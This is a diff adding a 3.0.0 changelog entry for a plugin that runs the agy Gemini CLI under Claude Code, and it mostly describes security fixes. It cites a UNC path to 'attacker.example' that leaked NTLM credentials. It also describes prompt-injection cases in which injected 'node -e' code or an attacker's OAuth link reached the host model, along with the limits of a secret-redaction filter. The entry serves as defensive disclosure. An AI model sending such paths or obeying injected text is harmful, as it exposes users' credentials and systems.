@@ -7,6 +7,206 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [3.0.0] — 2026-10-08
+
+### Security
+
+- **`update --apply` checks the agy tarball before it installs it.** The
+  tarball came from `npm pack` in your current directory with no explicit
+  registry, so a project `.npmrc` there could choose where it was downloaded
+  from, and nothing compared it with the npm registry record. Now `npm pack`
+  runs from the update's temporary directory with the npmjs.org registry and
+  scope registry on its command line. The integrity that `npm pack` reports
+  and the sha512 of the tarball must equal the `dist.integrity` of the
+  registry record, read over HTTPS from registry.npmjs.org, and the
+  extracted `package.json` must name this package and version. A missing
+  value or a mismatch stops the update before `agy plugin uninstall`, with
+  exit 1. With the registry unreachable, agy is now skipped.
+- **Reads of shared temp state are checked like writes.** On a shared POSIX
+  host, another local user could plant job state or an update-check cache
+  under the OS temp directory. `status`, `result` and `cancel` now refuse a
+  state root, workspace directory or `jobs` directory that fails the owner,
+  mode and symlink check, a legacy temp workspace directory that fails it is
+  skipped, and a cache that fails it counts as no cache. The state index
+  ignores entries that are not valid job records, and `status` reads a job
+  log only from the plugin's own path for that job. State locations do not
+  change. On Windows the owner and mode check stays a no-op.
+- **Recorded process start times are checked before a signal.** Before,
+  `cancel` and the cleanup a background wait runs when
+  its worker vanished signalled the stored worker or agy process id with no
+  check, so a process that later got the same id from the OS could be
+  stopped. Now the plugin stores the OS start time of each process it starts
+  (`workerProcessStartedAt`, `agyProcessStartedAt` in the job record), once,
+  at launch. Before a signal it reads the start time again, and the two must
+  agree to within 1 second. A replacement process with a start time within
+  1 second of the recorded time passes the check and is not caught. The
+  time between the check and the signal is a separate limit: the process
+  can end and the OS can give its id to another process then.
+  If the times differ by more than 1 second, `cancel` reports the new outcome
+  `unconfirmed` and exits 1, and the cleanup only logs it. A job record from
+  an older version has no start time, so the plugin does not signal its
+  processes: stop them yourself.
+- **The vision MCP server authorizes a path before any filesystem call.**
+  Before, `view_image` resolved the path from the model on disk and only then
+  checked the allowlist. On Windows, a UNC path such as
+  `\\attacker.example\share\x.png` thus opened an SMB or WebDAV session that
+  sent the user's NTLM credentials, even with an empty allowlist. Now the
+  server refuses a request whose lexical form (resolved, normalized,
+  case-folded on Windows) is not on the allowlist, before it reads anything.
+  `vision` now records each image twice: the absolute path as given and its
+  realpath. A spelling that is not on the list is refused, for example an
+  8.3 short name when the command named the long name.
+- **Claude Code wrappers no longer pre-approve every `node` command.**
+  Before, each `commands/*.md` granted `Bash(node:*)`. Claude Code applies
+  that grant to the host model's own Bash calls in the same turn, while the
+  model reads agy output built from untrusted diffs and commits. An injected
+  `node -e <code>` could thus run with no permission prompt. Now each wrapper
+  grants one prefix rule for the exact bootstrap invocation of its own bang
+  line. The wrappers no longer tell the model how to compose its own `node`
+  call or to re-run a command itself, and they show the runtime output in a
+  fenced block labelled as untrusted data. `rescue` is now
+  `disable-model-invocation: true` with a fixed bang line like the other
+  wrappers. It forwards `--background` and `--wait` to the runtime, so
+  `--background` queues a plugin job, and `--show-result` and `--request-id`
+  now work through it.
+- **Only agy's own sign-in prompt sets `auth_required`.** Before, the plugin
+  took the first Google OAuth URL from any agy output, including model text,
+  and printed it as "OAuth required. Open: ...". A prompt injection could
+  thus show an attacker's OAuth client as the plugin's own login step. Now
+  only the raw lines agy prints before its first stream-json event count.
+  The plugin tells the user to run `setup`, which shows agy's own prompt.
+  `status --json` reports `oauthUrl` as `null`, also for older job records.
+- **No Google OAuth URL leaves the plugin.** No live agy capture records
+  agy's `client_id` and `redirect_uri` to check a URL against, so the
+  plugin replaces each `accounts.google.com/o/oauth2/...` and
+  `accounts.google.com/signin/oauth...` URL with `[oauth-url-removed]`.
+  This applies to stderr (also the line that quotes agy's `result.error`),
+  streamed progress text, the stored answer and `rawOutput`, every `--json`
+  envelope and text report, and job records an older version stored. Other
+  URLs stay. Streamed progress text is now written up to its last
+  whitespace character, so a URL split across two deltas is also caught.
+
+### Breaking
+
+- **`vision` default model is now `gemini-3.8-flash-high`.** It was
+  `gemini-3.6-flash-high`. This is the only breaking change in 3.0.0. Every
+  verb, flag, exit code, `--json` field, and state location of 2.x keeps its
+  meaning.
+  - **Why.** Measured on agy 1.3.1 on 2026-10-08, the old default completed 3
+    of 5 runs. The other 2 failed with `UNAVAILABLE (code 503): No capacity
+    available for model gemini-3.6-flash-high on the server`. The new default
+    completed 5 of 5 runs. It used more tokens per run, 57,637 to 72,416
+    against 39,418 to 52,066, and it was faster, 27 to 51 seconds against 45
+    to 64 seconds. Five runs per model are a small sample.
+  - **No earlier notice.** No 2.x release announced this change first. The
+    contract allows a breaking change in a major release, so 3.0.0 makes it
+    without a deprecation period.
+  - **What you may notice.** The `model` field of a `vision` `--json` envelope
+    and `provenance.model` on the job name the new model, and each run costs
+    more tokens.
+  - **The way back.** Pass `--model gemini-3.6-flash-high`. That model can fail
+    with the 503 capacity error again.
+  - Changed in the help text, `commands/vision.md`, `docs/COMMANDS.md`, and
+    `docs/COMPATIBILITY.md`.
+
+### Changed
+
+- **The 3.x contract.** The compatibility contract now runs from 3.0.0. A
+  documented surface is marked deprecated first and stays for at least one more
+  3.x minor release, and a removal waits for 4.0.0. The README Status block,
+  `docs/COMPATIBILITY.md`, `docs/COMMANDS.md`, and `CONTRIBUTING.md` say 3.x.
+  Statements about what 2.x did keep their wording.
+- **agy 1.3.1 measured per verb.** The `docs/COMPATIBILITY.md` row for agy 1.3.1
+  now names, per verb, what passed, what failed, and what was not run, and the
+  transcript table has the raw file for each probe. A new section lists the
+  isolated plugin install, the project-rule probes, and the conversation
+  pruning. 1.2.13 to 1.3.0 are not claimed as measured.
+- **Effort levels on agy 1.3.1.** `agy --help` and the bad-value error list
+  `xhigh`, but every model refused `xhigh` and `max` in the probes. The plugin
+  keeps `low|medium|high|agy-default`. The reason is in
+  `docs/COMPATIBILITY.md#effort-levels-on-agy-131`.
+- **Troubleshooting.** `docs/INSTALL.md` has three new rows: a prompt that needs
+  a shell command (headless agy denies the `command` tool), a `vision` 503
+  capacity error, and a reinstall that reports another process holding the
+  plugin. The tarball example no longer names a version.
+- **README "Why this plugin".** The 21 bullets became 8 short ones. The facts
+  they held are in `docs/COMMANDS.md`, `docs/COMPATIBILITY.md`, and the README
+  sections that stay.
+- **Release checklist.** In `docs/RELEASING.md`, the documentation-currency
+  step now asks for one inventory bullet per new field, key, or rule and for an
+  independent check of the quoted facts. A new step covers the plugin `setup`
+  verb and the MCP checks. The later steps are renumbered.
+- **The real failure reason in JSON errors.** When agy ends a run with
+  `result.status: ERROR` and a `result.error` line, that line is now the
+  failure reason: `errorMessage` and `healthMessage` on the stored job, and
+  `details.error.message` in a foreground `run_failed` envelope and in
+  `result <id> --json` for a `job_failed` job. Before, both said only
+  `failed (failed).` or `job <id> failed.`. The reason is one line of at most
+  300 characters, cut at a complete token. The filter removes ANSI CSI and
+  OSC sequences and replaces each other ESC and next-character pair with
+  the disallowed character `=`. It applies Unicode NFKC and replaces format
+  characters and default-ignorable code points with a private U+E000 marker.
+  For a token with this marker, it removes all markers and checks the joined
+  token, or its text before the first `:`, for a keyword. This check ignores
+  letter case and removes the keyword rule's surrounding punctuation.
+  A joined keyword uses the keyword rule; any other token is replaced.
+  Thus, a zero-width character between `Bearer` and `shortSecret` causes
+  replacement of the whole token. Raw U+E000 characters get the same
+  treatment. No private marker reaches the output. The filter turns control and
+  separator characters into spaces. It keeps tokens with at most
+  32 characters, only ASCII letters, digits or `. , : ; ! ( ) [ ] ' " _ - /`,
+  no `//`, and these limits for each complete run of ASCII letters and
+  digits: fewer than 12 characters for a mixed run, at most 12 for digits
+  only, and at most 20 for letters only. It replaces a token with an ASCII
+  letter directly before `:` and an ASCII letter or digit directly after
+  it, including `src/index.mjs:12`. It replaces
+  anything else with `[redacted]`, or `[redacted-url]` if the token contains
+  `://`. Credential keywords take precedence: the keyword stays and the
+  next two tokens are replaced. For a keyword with a value attached by
+  `:`, such as `password:hunter2`, that token and the next token are
+  replaced. A final `:` with no attached value uses the usual keyword rule.
+  The complete keyword list is in
+  `docs/COMPATIBILITY.md#failure-reason`. Numeric `(code N):` diagnostics
+  with 1 to 20 digits keep the keyword exception; the digit run must also
+  pass the shape rules. The word after `(code <digits>):` is an ordinary
+  token. Adjacent markers of the same type become one marker. The source
+  is agy's own error text. A secret split by a line break or a space-class
+  character into pieces that each fit the grammar can remain. A short
+  secret after a word that is not in the keyword list can remain. A secret
+  that fits the allowed shape can remain. After the cut, an empty result
+  or a result with no run of three ASCII letters outside the markers
+  returns `null`, and the old
+  generic text stays. Error codes, statuses, `answer`, exit codes and the stderr line do
+  not change. A timeout, output-limit or cancellation reason still wins. The
+  `error:` and `AGY_ERROR:` stderr markers get the same redaction. See
+  `docs/COMPATIBILITY.md#failure-reason`.
+- **agy 1.3.1 is the newest measured version.** `LAST_MEASURED_AGY_VERSION` is
+  `1.3.1`. `doctor` and the version warning now class 1.3.1 as verified, 1.2.13
+  to 1.3.0 as unmeasured, and anything newer as beyond the measured range.
+
+### Fixed
+
+- **Raw stderr in the stored failure reason.** When agy gave no reason of its
+  own, a failed job's `errorMessage` was its raw stderr, and `--show-result`
+  (`review`, `rescue`, `task`), `status <id>` and `result <id>` printed it
+  as it was. It is now the same one-line redacted text as above, or empty
+  when nothing readable is left, and then the generic text stays. The stored
+  `result.stderr` is unchanged. A multi-line stderr is no longer shown in
+  full in the `## Error` section of `status <id>`.
+- **`update --apply` from inside the agy install root.** The updater now
+  compares the real path of the current directory with the agy install root
+  (`~/.gemini/config/plugins/antigravity`), junctions and symlinks included.
+  If the current directory is that root or lies inside it, the updater moves
+  to its temporary directory, prints one line, and runs every step from
+  there. If it cannot move, it runs no step and exits 1. Before, agy could
+  fail to remove the directory, which left the uninstall half-done.
+
+### Tests
+
+- A denied `command` tool in a headless `rescue` run now has an end-to-end test
+  for the label line, the exact remedy, and the `agy_denied` envelope.
+- A failed `review --findings-json` run is tested to carry no findings fields.
+
 ## [2.1.0] — 2026-09-28
 
 ### Added
@@ -1207,7 +1407,8 @@ ahead of the June 18, 2026 Gemini CLI deprecation.
 - `gemini --experimental-acp` runtime path — deprecation deadline is too close
   to maintain a transitional fallback.
 
-[Unreleased]: https://github.com/SouthCarpet/antigravity-plugin/compare/v2.1.0...HEAD
+[Unreleased]: https://github.com/SouthCarpet/antigravity-plugin/compare/v3.0.0...HEAD
+[3.0.0]: https://github.com/SouthCarpet/antigravity-plugin/compare/v2.1.0...v3.0.0
 [2.1.0]: https://github.com/SouthCarpet/antigravity-plugin/compare/v2.0.2...v2.1.0
 [2.0.2]: https://github.com/SouthCarpet/antigravity-plugin/compare/v2.0.1...v2.0.2
 [2.0.1]: https://github.com/SouthCarpet/antigravity-plugin/compare/v2.0.0...v2.0.1
